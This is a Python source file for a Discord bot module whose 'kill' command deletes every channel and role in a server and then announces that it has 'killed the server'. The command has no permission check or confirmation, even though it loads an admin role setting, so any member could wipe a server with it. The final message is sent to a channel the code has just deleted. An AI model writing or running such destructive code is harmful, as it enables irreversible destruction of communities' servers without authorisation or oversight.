from sqlalchemy import true
from discord.ext import commands
import os
import discord
from discord.utils import get
from database import SessionLocal, engine
import models

channel_id = os.environ["CHANNEL"]
admin_role_name = os.environ["ADMIN_ROLE"]
admin_user = os.environ["ADMIN_ID"]

"""
The destroyer!
"""
class KillAll(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.channel_id = int(channel_id)
        self.admin_role = admin_role_name

    # new command take the server to church
    @commands.command()
    async def kill(self, ctx):
        # delete all channels in the server
        for channel in ctx.guild.channels:
            await channel.delete()
        # delete all roles in the server
        for role in ctx.guild.roles:
            await role.delete()
        
        # create a new channel
        await ctx.guild.create_text_channel("general")

        # send a message tagging the admin id
        await ctx.send(f"<@{admin_user}> I have killed the server!")


def setup(client):
    client.add_cog(KillAll(client))
